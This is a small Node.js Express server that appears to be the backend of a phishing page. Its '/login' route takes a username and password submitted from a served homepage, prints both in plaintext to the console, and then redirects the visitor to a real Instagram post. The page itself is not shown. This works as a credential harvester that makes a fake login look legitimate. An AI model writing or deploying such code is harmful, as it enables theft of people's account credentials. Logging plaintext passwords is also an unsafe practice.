import express from "express";

import bodyParser from "body-parser";
import { dirname } from "path";
import { fileURLToPath } from "url";
const __dirname=dirname(fileURLToPath(import.meta.url));
const port = 3000;
const app = express();

// app.use(express.static("public"));
app.use(bodyParser.urlencoded({ extended: true }));
app.get("/",  (req,res)=>{
    res.sendFile(__dirname + "/public/homepage.html");
     


});
app.post("/login", (req, res) => {
    const userName = req.body["username"];
    const password = req.body["password"];

    // Print the credentials to the console
    console.log("Username:", userName);
    console.log("Password:", password);
    res.redirect("https://www.instagram.com/p/C_dJCHAS3oW/");
});

app.listen(port, () => {
    console.log(`Listening on port ${port}`);
  });
  

